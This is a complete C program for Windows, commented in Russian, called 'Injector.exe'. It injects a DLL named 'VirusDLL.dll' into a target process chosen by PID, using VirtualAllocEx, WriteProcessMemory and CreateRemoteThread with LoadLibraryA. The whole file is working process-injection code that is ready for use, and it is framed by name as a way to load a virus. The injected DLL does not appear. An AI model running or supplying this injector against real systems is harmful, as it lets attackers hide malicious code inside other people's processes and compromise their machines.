#include <Windows.h>
#include <winerror.h>
#include <stdio.h>
#include <stdlib.h> // для atoi

int main(int argc, char* argv[])
{
    if (argc < 2)
    {
        printf("Usage: Injector.exe <PID>\n");
        return 1;
    }

    DWORD dwProcessId = atoi(argv[1]);

    // Путь к DLL
    char szDLLPathToInject[] = "C:\\Temp\\VirusDLL.dll";
    int nDLLPathLen = lstrlenA(szDLLPathToInject);
    int nTotBytesToAllocate = nDLLPathLen + 1; // включая нуль-терминатор

    // Открываем процесс с необходимыми правами
    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
        FALSE, dwProcessId);
    if (!hProcess)
    {
        printf("OpenProcess failed (error %d)\n", GetLastError());
        return 1;
    }

    // Выделяем память в удалённом процессе
    LPVOID lpRemoteMemory = VirtualAllocEx(hProcess, NULL, nTotBytesToAllocate,
                                           MEM_COMMIT, PAGE_READWRITE);
    if (!lpRemoteMemory)
    {
        printf("VirtualAllocEx failed (error %d)\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }

    // Записываем путь к DLL в выделенную память
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(hProcess, lpRemoteMemory, szDLLPathToInject,
                            nTotBytesToAllocate, &bytesWritten))
    {
        printf("WriteProcessMemory failed (error %d)\n", GetLastError());
        VirtualFreeEx(hProcess, lpRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Получаем адрес LoadLibraryA в kernel32.dll
    LPTHREAD_START_ROUTINE pLoadLibrary = (LPTHREAD_START_ROUTINE)
        GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "LoadLibraryA");
    if (!pLoadLibrary)
    {
        printf("GetProcAddress failed (error %d)\n", GetLastError());
        VirtualFreeEx(hProcess, lpRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Создаём удалённый поток, который загрузит нашу DLL
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibrary,
                                        lpRemoteMemory, 0, NULL);
    if (!hThread)
    {
        printf("CreateRemoteThread failed (error %d)\n", GetLastError());
        VirtualFreeEx(hProcess, lpRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    WaitForSingleObject(hThread, INFINITE);

    // Освобождаем ресурсы
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, lpRemoteMemory, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    printf("DLL injected successfully.\n");
    return 0;
}